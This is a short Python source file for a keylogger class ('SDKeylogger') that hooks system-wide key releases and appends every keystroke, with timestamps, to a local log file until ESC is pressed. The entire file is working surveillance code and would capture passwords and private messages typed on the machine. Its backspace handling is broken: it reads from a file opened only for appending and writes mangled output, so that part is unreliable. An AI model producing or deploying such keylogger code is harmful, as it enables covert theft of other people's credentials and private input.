import keyboard
from threading import Semaphore, Timer
import sys
import datetime


class SDKeylogger:
    def __init__(self, file):
        self.log = ""
        self.semaphore = Semaphore(0)
        self.is_ended = False
        self.is_open_now = True
        self.file = open(file, "a")
        self.d = datetime.datetime.now()

    def __repr__(self):
        return "<class 'SDKeylogger'>"

    def __str__(self):
        return "<class 'SDKeylogger'>"

    def __del__(self):
    	del self.file
    	del self.is_open_now
    	del self.is_ended
    	del self.log
    	del self.semaphore
    	print("[-] your key log is captured ... ")

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "decimal":
                name = "."
            elif name == "esc":
                name = "[ESC]"
                self.is_ended = True
            elif name == "backspace":
                name = self.file.read()
                self.file.write(name[:-1])
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def write_in_file(self, message):
        if self.is_open_now:
            self.file.write("\n\n" + "-"*10 + f"Date:- {self.d.day}/{self.d.month}/{self.d.year} and Time :- {self.d.hour}:{self.d.minute}:{self.d.second}" + "-"*10 + "\n")
            self.is_open_now = False
        self.file.write(self.log)

    def report(self):
        if self.log:
            self.write_in_file(self.log)
        self.log = ""
        if self.is_ended:
            self.end()
        else:
            Timer(interval=1, function=self.report).start()

    def start(self):
        print("[*] KeyLogger is started")
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()
    
    def end(self):
        self.semaphore.release()
        self.__del__()
